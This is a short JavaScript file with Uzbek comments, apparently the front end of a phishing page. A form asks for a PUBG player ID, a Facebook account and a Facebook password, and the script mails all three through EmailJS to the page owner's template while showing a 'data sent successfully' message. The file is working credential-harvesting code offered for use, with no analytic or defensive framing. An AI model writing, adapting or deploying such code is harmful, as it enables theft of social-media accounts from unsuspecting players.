// EmailJS hisobingizni sozlash
emailjs.init("3cL83Xn3-Ytlp2AEA"); // EmailJS User ID ni kiriting

document.getElementById('contactForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Formaning standart xatti-harakatlarini to'xtatadi

    // Formadagi qiymatlarni olish
    const pubgId = document.getElementById('pubgId').value;
    const facebookAccount = document.getElementById('facebookAccount').value;
    const password = document.getElementById('password').value;

    // Forma validatsiyasi
    if (!pubgId || !facebookAccount || !password) {
        document.getElementById('responseMessage').textContent = 'Iltimos, barcha maydonlarni to\'ldiring.';
        return;
    }

    // EmailJS API chaqirig'i
    emailjs.send("service_nupalnj", "template_ow7t6ci", {
        pubgId: pubgId,
        facebookAccount: facebookAccount,
        password: password
    })
    .then(response => {
        console.log('Success:', response);
        document.getElementById('responseMessage').textContent = 'Ma\'lumotlar muvaffaqiyatli yuborildi!';
    })
    .catch(error => {
        console.error('Error:', error);
        document.getElementById('responseMessage').textContent = 'Xatolik yuz berdi.';
        // Yana qo'shimcha ma'lumot
        console.error('Error details:', error.text); // Error details maydonini ko'rsatadi
    });
});
